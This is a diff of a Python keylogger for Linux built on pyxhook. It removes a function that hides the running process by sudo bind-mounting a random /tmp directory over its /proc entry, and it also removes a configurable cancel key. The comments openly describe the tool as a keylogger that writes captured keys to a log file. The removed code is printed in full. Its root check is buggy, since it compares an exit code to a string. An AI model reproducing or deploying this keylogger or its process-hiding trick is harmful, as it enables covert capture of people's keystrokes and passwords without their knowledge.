@@ -2,16 +2,6 @@
 # to be used in linux 
 import os 
 import pyxhook 
-
-def hide_process(self):
-	ch = string.uppercase + string.digits
-	# Bind mount - works with root on linux
-	token = "".join(random.choice(ch) for i in range(32))
-	pid = os.getpid()
-	print "[+] Current PID: {0}".format(pid)
-	if os.path.isdir("/tmp/{0}".format(token)) is False:
-		if os.system("sudo whoami") == 'root':
-			os.system("sudo mkdir /tmp/{1} && sudo mount -o bind /tmp/{1} /proc/{0}".format(pid,token))
   
 # This tells the keylogger where the log file will go. 
 # You can set the file path as an environment variable ('pylogger_file'), 
@@ -19,13 +9,6 @@ def hide_process(self):
 log_file = os.environ.get( 
     'pylogger_file', 
     os.path.expanduser('./file.log') 
-) 
-# Allow setting the cancel key from environment args, Default: ` 
-cancel_key = ord( 
-    os.environ.get( 
-        'pylogger_cancel', 
-        '`'
-    )[0] 
 ) 
   
 # Allow clearing the log file on start, if pylogger_clean is defined. 
